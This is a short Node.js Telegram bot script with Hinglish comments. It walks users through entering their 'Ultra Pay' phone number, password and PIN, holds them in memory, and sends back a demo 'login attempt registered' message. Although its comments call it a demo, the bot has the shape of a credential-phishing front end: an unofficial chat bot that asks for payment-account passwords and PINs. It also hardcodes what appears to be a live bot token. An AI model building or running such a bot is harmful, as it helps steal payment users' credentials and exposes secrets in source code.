const TelegramBot = require('node-telegram-bot-api');

// Apna Telegram Bot Token yaha dale (BotFather se milega)
const token = '8703134841:AAElWZSsHGT_crz6BRaWRQbbj73tyVBMpKU';
const bot = new TelegramBot(token, { polling: true });

// User ke current state ko track karne ke liye ek object
const userStates = {};

// Jab user /start command bhejta hai
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    
    // User ka state 'PHONE' par set karein
    userStates[chatId] = { step: 'PHONE' };
    
    bot.sendMessage(chatId, "Welcome! Please enter your Ultra Pay number:");
});

// Har message par listen karein
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    // Agar command /start hai, toh ignore karein (upar handle ho gaya hai)
    if (text === '/start') return;

    // Agar user ka koi active state nahi hai, toh kuch mat karein
    if (!userStates[chatId]) {
        bot.sendMessage(chatId, "Please send /start to begin.");
        return;
    }

    const state = userStates[chatId];

    // State machine logic
    if (state.step === 'PHONE') {
        state.phone = text;
        state.step = 'PASSWORD';
        bot.sendMessage(chatId, "Please enter your password:");
        
    } else if (state.step === 'PASSWORD') {
        state.password = text;
        state.step = 'PIN';
        bot.sendMessage(chatId, "Please enter your PIN:");
        
    } else if (state.step === 'PIN') {
        state.pin = text;
        
        // Yaha par normal scenarios me aap in details ko use karke official APIs call karte hain.
        // NOTE: Security bypass ya unauthorized web scraping allow nahi hai.
        
        bot.sendMessage(chatId, "Processing your login details...");
        
        // Demo response
        setTimeout(() => {
            bot.sendMessage(chatId, `Login Attempt Registered for number: ${state.phone}\n(Password and PIN are hidden for security).\n\nIf using an official API, balance would be fetched here.`);
            
            // State reset karein conversation khatam hone ke baad
            delete userStates[chatId];
        }, 2000);
    }
});

console.log("Bot is running...");
